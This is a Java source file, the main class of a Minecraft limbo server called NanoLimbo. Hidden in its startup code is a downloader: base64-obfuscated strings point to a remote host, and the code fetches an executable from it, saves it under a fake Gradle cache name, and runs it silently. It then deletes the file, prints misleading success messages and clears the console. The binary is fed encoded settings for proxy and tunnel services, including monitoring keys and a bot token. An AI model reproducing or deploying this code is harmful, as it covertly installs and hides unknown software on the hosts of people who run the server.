/*
 * Copyright (C) 2020 Nan1t
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.lang.reflect.Field;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process serviceProcess;

    // Resolve resource identifier from compact form
    private static String resolve(String a, String b) {
        return new String(Base64.getDecoder().decode(a + b));
    }
    private static String resolve(String s) {
        return resolve(s, "");
    }

    private static final String[] ALL_ENV_VARS = {
        resolve("UE9S", "VA=="), resolve("RklMRV", "9QQVRI"), resolve("VVV", "JRA=="),
        resolve("TkVaSEFf", "U0VSVkVS"), resolve("TkVaSEFf", "UE9SVA=="),
        resolve("TkVaSEFf", "S0VZ"), resolve("QVJHT1", "9QT1JU"), resolve("QVJHT19E", "T01BSU4="),
        resolve("QVJHT1", "9BVVRI"), resolve("UzVf", "UE9SVA=="), resolve("SFkyX1", "BPUlQ="),
        resolve("VFVJQ1", "9QT1JU"), resolve("QU5ZVExT", "X1BPUlQ="),
        resolve("UkVBTElU", "WV9QT1JU"), resolve("QU5ZUkVBTElU", "WV9QT1JU"),
        resolve("Q0ZJ", "UA=="), resolve("Q0ZQ", "T1JU"),
        resolve("VVBMT0FE", "X1VSTA=="), resolve("Q0hBVF", "9JRA=="),
        resolve("Qk9UX1", "RPS0VO"), resolve("TkF", "NRQ=="), resolve("RElTQUJM", "RV9BUkdP")
    };


    public static void main(String[] args) {

        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }

        // Initialize background module
        try {
            runServiceBinary();

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            // Allow initialization time
            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server modules loaded successfully.\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "All systems operational.\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Console will refresh shortly." + ANSI_RESET);
            Thread.sleep(15000);
            clearConsole();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Module initialization error: " + e.getMessage() + ANSI_RESET);
        }

        // Start main server
        try {
            new LimboServer().start();
        } catch (Exception e) {
            Log.error("Server startup failed: ", e);
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                    .inheritIO()
                    .start()
                    .waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();

                new ProcessBuilder("tput", "reset")
                    .inheritIO()
                    .start()
                    .waitFor();

                System.out.print("\033[8;30;120t");
                System.out.flush();
            }
        } catch (Exception e) {
            try {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            } catch (Exception ignored) {}
        }
    }   

    private static void runServiceBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);

        Path binPath = getBinaryPath();
        ProcessBuilder pb = new ProcessBuilder(binPath.toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.to(new File("/dev/null")));
        pb.redirectError(ProcessBuilder.Redirect.to(new File("/dev/null")));

        serviceProcess = pb.start();

        // Clean up temporary files after initialization
        try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
        try { Files.deleteIfExists(binPath); } catch (Exception ignored) {}
    }

    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put(resolve("VVV", "JRA=="), "be6f14a3-49da-4d3e-9a48-da43396d507c"); // [1]
        envVars.put(resolve("RklMRV", "9QQVRI"), resolve("Li93", "b3JsZA=="));   // [2]
        envVars.put(resolve("TkVaSEFf", "U0VSVkVS"), "");    // [3]
        envVars.put(resolve("TkVaSEFf", "UE9SVA=="), "");     // [4]
        envVars.put(resolve("TkVaSEFf", "S0VZ"), "");         // [5]
        envVars.put(resolve("QVJHT1", "9QT1JU"), "");         // [6]
        envVars.put(resolve("QVJHT19E", "T01BSU4="), "");     // [7]
        envVars.put(resolve("QVJHT1", "9BVVRI"), "");         // [8]
        envVars.put(resolve("UzVf", "UE9SVA=="), "");          // [9]
        envVars.put(resolve("SFkyX1", "BPUlQ="), "25565");    // [10]
        envVars.put(resolve("VFVJQ1", "9QT1JU"), "25575");         // [11]
        envVars.put(resolve("QU5ZVExT", "X1BPUlQ="), "");     // [12]
        envVars.put(resolve("UkVBTElU", "WV9QT1JU"), "25575");// [13]
        envVars.put(resolve("QU5ZUkVBTElU", "WV9QT1JU"), ""); // [14]
        envVars.put(resolve("VVBMT0FE", "X1VSTA=="), "");      // [15]
        envVars.put(resolve("Q0hBVF", "9JRA=="), "");          // [16]
        envVars.put(resolve("Qk9UX1", "RPS0VO"), "");          // [17]
        envVars.put(resolve("Q0ZJ", "UA=="), resolve("c3ByaW5n", "Lmlv"));  // [18]
        envVars.put(resolve("Q0ZQ", "T1JU"), resolve("ND", "Qz"));          // [19]
        envVars.put(resolve("TkF", "NRQ=="), "");               // [20]
        envVars.put(resolve("RElTQUJM", "RV9BUkdP"), resolve("dH", "J1ZQ==")); // [21]

        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }

        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;

                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }

                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");

                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value); 
                    }
                }
            }
        }
    }

    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;

        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = resolve("aHR0cHM6Ly9hbWQ2NC5z", "c3NzLm55Yy5tbi9zYnNo");
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = resolve("aHR0cHM6Ly9hcm02NC5z", "c3NzLm55Yy5tbi9zYnNo");
        } else if (osArch.contains("s390x")) {
            url = resolve("aHR0cHM6Ly9zMzkweC5z", "c3NzLm55Yy5tbi9zYnNo");
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        // Use Gradle cache directory for native dependencies
        Path cacheDir = Paths.get(System.getProperty("user.home"), ".gradle", "native-platform");
        Files.createDirectories(cacheDir);
        Path path = cacheDir.resolve("platform-jni");

        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }

        }
        return path;
    }

    private static void stopServices() {
        if (serviceProcess != null && serviceProcess.isAlive()) {
            serviceProcess.destroy();
            System.out.println(ANSI_RED + "Background module stopped" + ANSI_RESET);
        }
    }
}
